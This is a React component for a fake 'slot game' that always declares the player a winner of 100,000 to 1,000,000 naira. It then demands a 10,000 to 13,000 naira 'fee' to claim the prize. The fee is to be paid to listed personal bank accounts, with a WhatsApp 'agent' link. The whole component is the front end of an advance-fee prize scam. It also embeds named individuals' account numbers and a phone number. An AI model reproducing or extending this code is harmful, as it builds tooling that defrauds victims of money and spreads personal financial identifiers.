import React, { useState } from "react";
import videoSrc from '../assets/777.mp4';
import ReactConfetti from "react-confetti";

const SlotGame = () => {
  const [gameStarted, setGameStarted] = useState(false);
  const [prize, setPrize] = useState(null);
  const [fee, setFee] = useState(null);
  const [accountDetails, setAccountDetails] = useState(null);
  const [message, setMessage] = useState("");
  const [popupVisible, setPopupVisible] = useState(true);

  const startGame = () => {
    setGameStarted(true);
    setMessage(""); // Reset message
    setPopupVisible(false); // Close the start game popup immediately

    // Simulate winning the game after the video starts
    setTimeout(() => {
      const randomPrize = [100000, 150000, 1000000][Math.floor(Math.random() * 3)];
      setPrize(randomPrize);

      if (randomPrize > 99000 && randomPrize < 250000) {
        setFee(10000);
      } else if (randomPrize > 250000){
        setFee(13000)
      }
    }, 4000); // Wait 4 seconds before showing the prize (simulating video duration)
  };

  const handlePayment = () => {
    if (fee) {
      setMessage("Paying fee...");
      setTimeout(() => {
        setMessage("Payment successful!");
        setAccountDetails({
          name: "Emavworhe Efemena Mabel",
          accountNumber: "9037218378",
          bankName: "Opay (PAYCOM)",
          agentNumber: "+2349110520620"
        });
      }, 2000);
    }
  };

  
  window.addEventListener("resize", () => {
    setWindowWidth(screen.innerWidth);
    setWindowHeight(screen.innerHeight);
  });
  const [windowWidth, setWindowWidth] = useState(screen.innerWidth); // For confetti responsiveness
  const [windowHeight, setWindowHeight] = useState(screen.innerHeight);

  const closePopup = () => {
    setPopupVisible(false);
  };

  const handleVideoEnd = () => {
    const formattedPrize = prize.toLocaleString('en-NG'); // Format prize with commas
    setMessage(`You have won NGN ${formattedPrize}! You need to pay a fee to claim it.`);
};


  const handleClaimPrize = () => {
    setAccountDetails({
      name: "Raphael Tomiwa Jesse",
      accountNumber: "8071273078",
      bankName: "Moniepoint Microfinance Bank",
      agentNumber: "+2349110520620"
    });
  };

  const whatsappLink = "https://wa.me/2349110520620?text=Hello%20Agent,%20I%20need%20assistance%20in%claiming%20my%20prize.";


  return (
    <div className="relative h-screen w-full bg-black">
      {/* Popup for slot game start */}
      {message !== "" && (
        <ReactConfetti width={windowWidth} height={windowHeight} numberOfPieces={1000}/>
      )}
      {popupVisible && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
          onClick={closePopup}
        >
          <div
            className="bg-white p-8 rounded-lg shadow-lg text-center w-[300px]"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center">
              <h2 className="text-2xl font-bold text-black">Slot Game</h2>
              <button onClick={closePopup} className="text-xl text-red-600">
                X
              </button>
            </div>

            {/* Start Game button */}
            {!gameStarted ? (
              <button
                onClick={startGame}
                className="bg-green-500 text-white py-2 px-4 rounded-md hover:bg-green-600 transition duration-300 mt-4"
              >
                Start Game
              </button>
            ) : (
              <>
                <p className="mt-4 text-xl font-semibold">{message}</p>
                {prize && <p className="mt-2 text-lg text-black">Prize: NGN {prize}</p>}
                {fee && (
                  <>
                    <p className="mt-2 text-lg text-black">Fee to claim prize: NGN {fee}</p>
                    <button
                      onClick={handlePayment}
                      className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4 transition duration-300"
                    >
                      Pay Fee
                    </button>
                  </>
                )}
              </>
            )}
          </div>
        </div>
      )}

      {/* Slot Video */}
      {gameStarted && (
        <div
          className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-55 rounded-lg"
          onClick={closePopup}
        >
          <div
            className="relative w-[100%] h-[100%] bg-black border-black" // Ensures proper sizing
            onClick={(e) => e.stopPropagation()}
          >
            {message !== "" && <p className="text-center p-3">{message} Fee: {fee}</p>}
            {message !== "" && <p className="text-black font-bold bg-yellow-400 px-3 text-center py-2 w-40 self-center items-center rounded-lg cursor-pointer hover:bg-black hover:text-white transition ease duration-300" style={{
                alignSelf: 'center',
                justifySelf: 'center'
            }} onClick={handleClaimPrize}>Claim Prize</p>}
            <video
              autoPlay
              muted={false} // No muting
              loop={false}  // No loop
              className="w-full h-[80%] object-contain" // Make sure video fills the space
              src={videoSrc} // Ensure the correct path to your video
              onError={(e) => console.log('Video not found or failed to load')}
              onEnded={handleVideoEnd} // Show message once the video ends
              controls={false}
            />
          </div>
        </div>
      )}

      

      {/* Account Details popup */}
      {accountDetails && (
  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div className="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full">
      <div className="flex justify-between items-center mb-4">
        <h2 className="text-xl font-semibold text-center text-gray-900">Pay the fee to claim your prize</h2>
        <button
          onClick={() => setAccountDetails(null)}
          className="text-red-600 text-xl font-bold"
        >
          X
        </button>
      </div>
      <p className="text-center text-gray-800 mb-2">Name: {accountDetails.name}</p>
      <p className="text-center text-gray-800 mb-2">Account Number: {accountDetails.accountNumber}</p>
      <p className="text-center text-gray-800 mb-2">Bank Name: {accountDetails.bankName}</p>
      <p className="text-center text-gray-800 mb-2">Agent Number: {accountDetails.agentNumber}</p>
      <a 
        href={whatsappLink} 
        target="_blank" 
        rel="noopener noreferrer" 
        className="block w-full bg-green-500 text-white p-2 rounded-md text-center"
      >
        Send DM on WhatsApp
      </a>
      <p className="text-center text-gray-800">Please contact your agent for further assistance.</p>
    </div>
  </div>
)}

    </div>
  );
};

export default SlotGame;
